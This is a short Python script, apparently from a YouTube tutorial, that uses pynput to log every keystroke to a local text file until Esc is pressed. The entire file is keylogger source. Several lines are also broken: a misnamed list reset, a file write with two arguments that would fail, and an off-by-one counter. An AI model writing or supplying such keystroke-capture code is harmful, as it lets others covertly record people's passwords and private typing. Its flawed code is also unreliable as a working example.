# -*- coding: utf-8 -*-
"""
Created on Sun May  9 15:59:25 2021

@author: 
    https://youtu.be/TbMKwl11itQ
"""

from pynput.keyboard import Key, Listener
print("Online")

count = 0
keys = []


def on_press(key):
    global keys, count
    print('{0} pressed'.format(key))
    count += 1
    keys.append(key)
    if count >= 5:
        count = 1
        write_file(keys)
        key = []


def write_file(keys):
    with open("5921log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 1:
                f.write(str(key), "\n")
            elif k.find("Key") == -1:
                f.write(k)


def on_release(key):
    if key == Key.esc:
        # Stop listener
        return False


# Collect events until released
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()